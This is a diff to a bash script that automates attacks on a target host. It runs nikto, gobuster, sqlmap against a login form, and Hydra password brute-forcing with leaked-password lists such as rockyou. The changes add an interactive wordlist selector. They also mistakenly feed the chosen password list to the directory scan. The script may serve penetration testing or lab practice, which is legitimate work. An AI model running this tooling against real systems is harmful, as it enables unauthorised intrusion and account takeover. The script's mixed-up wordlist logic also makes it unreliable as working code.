@@ -8,10 +8,10 @@
 
 TARGET=$1
 OUTPUT_DIR="results_$TARGET"
-WORDLIST="/usr/share/wordlists/dirb/common.txt"
+WORDLIST_DIR="/usr/share/wordlists"
+CURRENT_WORDLIST="$WORDLIST_DIR/wordlist-current.txt"
 LOGIN_URL="http://$TARGET/login-submit"
 USERNAME_LIST="usernames.txt"
-PASSWORD_WORDLIST="/usr/share/wordlists/rockyou.txt"
 
 # Colors
 GREEN='\033[0;32m'
@@ -24,12 +24,43 @@ fi
 
 mkdir -p "$OUTPUT_DIR"
 
-# Ensure rockyou.txt exists – fetch the fresh, uncompressed file
-if [[ ! -f "$PASSWORD_WORDLIST" ]]; then
+# ==================================================
+# Wordlist Management
+# ==================================================
+declare -A WORDLISTS=(
+  ["rockyou"]="$WORDLIST_DIR/rockyou.txt"
+  ["500worst"]="500-worst-passwords.txt"
+  ["john"]="/usr/share/john/password.lst"
+  ["common"]="$WORDLIST_DIR/dirb/common.txt"
+)
+
+switch_wordlist() {
+  local choice=$1
+  if [[ -n "${WORDLISTS[$choice]}" && -f "${WORDLISTS[$choice]}" ]]; then
+    ln -sf "${WORDLISTS[$choice]}" "$CURRENT_WORDLIST"
+    echo "[*] Switched current wordlist → $choice (${WORDLISTS[$choice]})"
+  else
+    echo "[!] Wordlist \"$choice\" not found or missing. Available options:"
+    for key in "${!WORDLISTS[@]}"; do
+      echo "  - $key"
+    done
+    exit 1
+  fi
+}
+
+# Ask user which wordlist to use
+echo "Choose password wordlist: rockyou | 500worst | john | common"
+read -p "Enter choice: " WL_CHOICE
+switch_wordlist "$WL_CHOICE"
+
+PASSWORD_WORDLIST="$CURRENT_WORDLIST"
+
+# Ensure rockyou.txt exists – fetch if missing
+if [[ "$WL_CHOICE" == "rockyou" && ! -f "$WORDLIST_DIR/rockyou.txt" ]]; then
     echo "[!] rockyou.txt not found – fetching a clean copy …"
-    curl -L -o /usr/share/wordlists/rockyou.txt \
+    curl -L -o "$WORDLIST_DIR/rockyou.txt" \
          https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt
-    sudo chmod 644 /usr/share/wordlists/rockyou.txt
+    sudo chmod 644 "$WORDLIST_DIR/rockyou.txt"
 fi
 
 # Determine the fail-string dynamically (fallback to "Invalid")
@@ -48,15 +79,13 @@ nikto -h "http://$TARGET" -output "$OUTPUT_DIR/nikto.txt"
 
 echo -e "${GREEN}[4] Directory brute-forcing with Gobuster...${NC}"
 if command -v gobuster &>/dev/null; then
-  WORDLIST="${WORDLIST:-/usr/share/wordlists/dirb/common.txt}"
-  
-  if [[ ! -f "$WORDLIST" ]]; then
-    echo "[!] Wordlist not found at: $WORDLIST"
+  if [[ ! -f "$PASSWORD_WORDLIST" ]]; then
+    echo "[!] Wordlist not found at: $PASSWORD_WORDLIST"
     echo "[!] Skipping Gobuster scan."
   elif [[ -f "$OUTPUT_DIR/gobuster.txt" ]]; then
     echo "[*] Gobuster output already exists. Skipping..."
   else
-    gobuster dir -u "http://$TARGET" -w "$WORDLIST" -o "$OUTPUT_DIR/gobuster.txt"
+    gobuster dir -u "http://$TARGET" -w "$PASSWORD_WORDLIST" -o "$OUTPUT_DIR/gobuster.txt"
   fi
 else
   echo "[!] Gobuster not found. Skipping directory brute-force."
@@ -67,7 +96,7 @@ sqlmap -u "$LOGIN_URL" --batch --forms --crawl=1 --output-dir="$OUTPUT_DIR/sqlma
 
 echo -e "${GREEN}[6] Brute-force login with Hydra...${NC}"
 if command -v hydra &>/dev/null; then
-  hydra -L "$USERNAME_LIST" -P "$PASSWORD_WORDLIST" -f -V \
+  hydra -L "$USERNAME_LIST" -P "$PASSWORD_WORDLIST" -f -vV \
         "$TARGET" http-post-form "/login-submit:username=^USER^&password=^PASS^:F=$FAIL_STRING" \
         -o "$OUTPUT_DIR/hydra.txt"
 else
@@ -77,11 +106,9 @@ fi
 # ==================================================
 # 7. Final Results
 # ==================================================
-
 RESULTS_DIR=$OUTPUT_DIR
 echo -e "${GREEN}[*] Generating structured Markdown findings...${NC}"
 
-# Generate report
 ./report.sh "$TARGET" "$RESULTS_DIR"
 
 echo -e "${GREEN}[*] All tasks completed. Report is located in $OUTPUT_DIR/report.md${NC}"
@@ -89,5 +116,3 @@ echo -e "${GREEN}[*] All tasks completed. Report is located in $OUTPUT_DIR/repor
 ./report_html.sh "$TARGET" "$RESULTS_DIR"
 
 echo -e "${GREEN}[*] HTML report generated at $RESULTS_DIR/report.html${NC}"
-
-# (This is just a blank line)
